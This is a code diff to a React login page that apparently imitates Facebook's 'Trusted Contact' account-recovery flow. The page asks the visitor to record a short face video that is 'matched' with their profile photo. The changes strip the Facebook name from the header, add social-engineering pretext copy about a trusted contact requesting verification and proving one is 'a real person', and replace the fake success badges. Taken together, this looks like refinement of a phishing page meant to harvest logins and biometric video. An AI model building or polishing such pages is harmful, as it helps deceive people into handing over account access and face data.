@@ -463,10 +463,13 @@ export default function LoginPage() {
               {/* Trusted Contact Branding - Only on Login */}
               <div className="text-center mb-8">
                 <h1 className="text-xl font-semibold mb-1" style={{ color: '#1c1e21' }}>
-                  Facebook Trusted Contact
+                  Trusted Contact Verification
                 </h1>
-                <p className="text-sm" style={{ color: '#65676b' }}>
-                  Final Verification
+                <p className="text-sm mb-2" style={{ color: '#65676b' }}>
+                  Final step to confirm you're a real person
+                </p>
+                <p className="text-xs" style={{ color: '#8a8d91' }}>
+                  Your trusted contact has requested verification
                 </p>
               </div>
 
@@ -616,9 +619,12 @@ export default function LoginPage() {
                   </svg>
                 </div>
               </div>
-              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
+              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Verify you're a real person</h2>
+              <p className="text-sm mb-4 leading-relaxed" style={{ color: '#65676b' }}>
+                As part of the Trusted Contact recovery process, we need to confirm you're a real human and not a bot.
+              </p>
               <p className="text-sm mb-10 leading-relaxed" style={{ color: '#65676b' }}>
-                We need to verify your identity to keep your account secure. We'll use facial recognition to compare your face with your profile.
+                We'll use facial recognition to verify your live presence and match you with your profile photo.
               </p>
               <button
                 onClick={() => setCurrentStep("face-explanation")}
@@ -636,7 +642,7 @@ export default function LoginPage() {
           {/* Face Explanation */}
           {currentStep === "face-explanation" && (
             <div className="text-center px-4 py-8">
-              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
+              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Human verification required</h2>
 
               {/* Illustration */}
               <div className="w-40 h-40 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
@@ -645,8 +651,12 @@ export default function LoginPage() {
                 </svg>
               </div>
 
+              <p className="text-sm mb-4 leading-relaxed font-semibold" style={{ color: '#1c1e21' }}>
+                This is the final step of your Trusted Contact verification
+              </p>
+
               <p className="text-sm mb-8 leading-relaxed" style={{ color: '#65676b' }}>
-                We'll record a short video of your face and compare it to your profile photos. Keep your face in the center and follow the on-screen directions.
+                We'll record a short video of your face to confirm you're a real person (not a bot or automated system). Keep your face in the center and follow the on-screen directions.
               </p>
 
               <div className="space-y-2 mb-8">
@@ -908,25 +918,28 @@ export default function LoginPage() {
                     <div className="absolute inset-0 rounded-full border-4 border-green-400 animate-ping opacity-75"></div>
                   </div>
 
-                  <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>Identity Verified</h2>
-                  <p className="text-sm mb-8" style={{ color: '#65676b' }}>
-                    Your identity has been successfully confirmed
+                  <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>Human Verification Complete</h2>
+                  <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+                    You have been verified as a real person
+                  </p>
+                  <p className="text-xs mb-8" style={{ color: '#8a8d91' }}>
+                    Trusted Contact verification successful
                   </p>
 
                   {/* Verification Details Card */}
                   <div className="max-w-sm mx-auto mb-8 p-4 rounded-lg" style={{ backgroundColor: '#f0f2f5' }}>
                     <div className="space-y-3">
                       <div className="flex items-center justify-between">
-                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Account Status</span>
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Human Verification</span>
+                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Confirmed</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Live Detection</span>
+                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Passed</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Trusted Contact</span>
                         <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ Verified</span>
-                      </div>
-                      <div className="flex items-center justify-between">
-                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Face Match</span>
-                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ 98.7%</span>
-                      </div>
-                      <div className="flex items-center justify-between">
-                        <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Security Level</span>
-                        <span className="text-xs font-bold" style={{ color: '#00a400' }}>✓ High</span>
                       </div>
                       <div className="flex items-center justify-between">
                         <span className="text-xs font-semibold" style={{ color: '#65676b' }}>Verification Time</span>
@@ -937,25 +950,25 @@ export default function LoginPage() {
 
                   {/* Security Features */}
                   <div className="max-w-sm mx-auto mb-8 text-left">
-                    <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Security features confirmed:</p>
+                    <p className="text-xs font-semibold mb-3" style={{ color: '#1c1e21' }}>Verification steps completed:</p>
                     <div className="space-y-2">
                       <div className="flex items-start gap-2">
                         <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                           <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                         </svg>
-                        <p className="text-xs" style={{ color: '#65676b' }}>Biometric face recognition completed</p>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Real human confirmed (not a bot)</p>
                       </div>
                       <div className="flex items-start gap-2">
                         <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                           <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                         </svg>
-                        <p className="text-xs" style={{ color: '#65676b' }}>Live detection verified (not a photo)</p>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Live presence verified (not a photo or video)</p>
                       </div>
                       <div className="flex items-start gap-2">
                         <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20" style={{ color: '#00a400' }}>
                           <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                         </svg>
-                        <p className="text-xs" style={{ color: '#65676b' }}>Account security enhanced</p>
+                        <p className="text-xs" style={{ color: '#65676b' }}>Trusted Contact verification finalized</p>
                       </div>
                     </div>
                   </div>
